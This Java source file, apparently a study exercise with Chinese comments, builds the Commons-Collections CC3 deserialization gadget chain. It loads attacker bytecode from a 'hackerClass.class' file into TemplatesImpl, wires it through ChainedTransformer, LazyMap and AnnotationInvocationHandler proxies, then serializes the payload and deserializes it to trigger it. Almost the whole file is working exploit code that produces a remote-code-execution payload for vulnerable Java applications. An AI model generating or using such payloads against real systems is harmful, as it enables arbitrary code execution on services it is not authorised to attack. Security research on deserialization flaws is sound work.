package cc3;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections4.functors.InstantiateTransformer;
import toolkit.Seriliazation;

import javax.xml.transform.Templates;
import javax.xml.transform.TransformerConfigurationException;
import java.io.File;
import java.io.FileDescriptor;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

public class CC3Chain {
    private static String bytecodePath = "target/classes/cc3/hackerClass.class";

    public static void main(String[] args) throws Exception {
        cc3();
        suspend();
    }

    /**
     * cc3 动态类加载 - 代码执行
     * cc1, cc6 是命令执行
     *
     * Gaget Chain:
     *  com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.newTransformer()
     *      -> getTransletInstance()
     *          -> defineTransletClasses() -> newInstance() 对象初始化
     *              -> defineClass(final byte[] b)
     *                  -> defineClass(String name, byte[] b, int off, int len)
     */
    public static void cc3() throws Exception {
        // 需要满足的约束：_name, _bytecodes, _tfactory
        TemplatesImpl templates = new TemplatesImpl();
        Class clazz_templatesImpl = templates.getClass();

        // 赋值
        Field fieldName = clazz_templatesImpl.getDeclaredField("_name");
        fieldName.setAccessible(true);
        fieldName.set(templates, "aaa");;

        Field fieldBytecodes = clazz_templatesImpl.getDeclaredField("_bytecodes");
        fieldBytecodes.setAccessible(true);
        byte[][] bytecodes = new byte[][]{
                Files.readAllBytes(Paths.get(bytecodePath))
        };
        fieldBytecodes.set(templates,  bytecodes);

        // 这仨没必要赋值

        // ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap()
        // 因为不在本地运行，只需要在反序列化的时候运行，因此可以不管
//        Field fieldTfactory = clazz_templatesImpl.getDeclaredField("_tfactory");
//        fieldTfactory.setAccessible(true);
//        fieldTfactory.set(templates, new TransformerFactoryImpl());

//        Field fieldAuxClasses = clazz_templatesImpl.getDeclaredField("_auxClasses");
//        fieldAuxClasses.setAccessible(true);
//        fieldAuxClasses.set(templates, new HashMap<String, Class<?>>());
//
//        Field fieldTransletIndex = clazz_templatesImpl.getDeclaredField("_transletIndex");
//        fieldTransletIndex.setAccessible(true);
//        fieldTransletIndex.set(templates, 0);

        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(templates),
                new InvokerTransformer("newTransformer", new Class[]{}, new Object[]{}),
                new ConstantTransformer(new HashSet<String>())
                /**
                 * 另一种利用方法
                */
                // 这个类是不能序列化的
//                new org.apache.commons.collections4.functors.ConstantTransformer(TrAXFilter.class),
//                new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates}),
//                new org.apache.commons.collections4.functors.ConstantTransformer(new HashSet<>())
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        LazyMap lazyMap = (LazyMap) LazyMap.decorate((Map) new HashMap(), chainedTransformer);

        // 构造一个代理
        String entryClass = "sun.reflect.annotation.AnnotationInvocationHandler";
        Class clazzAIHandler = Class.forName(entryClass);

        Constructor constructorAIHandler = clazzAIHandler.getDeclaredConstructor(Class.class, Map.class);
        constructorAIHandler.setAccessible(true);

        // 用于代理一个 lazymap，会在调用 entrySet 的时候必然走到 invoke 里，在 invoke 里调用 get，在 get 中调用 Transformer
        InvocationHandler AIHandler = (InvocationHandler) constructorAIHandler.newInstance(Override.class, lazyMap);

        // 接收参数：ClassLoader loader, Class<?>[] interfaces, InvocationHandler h
        Map mapProxy = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Map.class}, AIHandler);

        // 用于反序列化的对象，readObject 的时候会调用里面 map 的 entrySet
        InvocationHandler h = (InvocationHandler) constructorAIHandler.newInstance(Override.class, mapProxy);

        Seriliazation.serialize(h);
        Seriliazation.unserialize("ser.bin");
    }

    private static void suspend() {
        try {
            // 让主线程进入长时间休眠，实现挂起
            Thread.sleep(Long.MAX_VALUE);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }
}
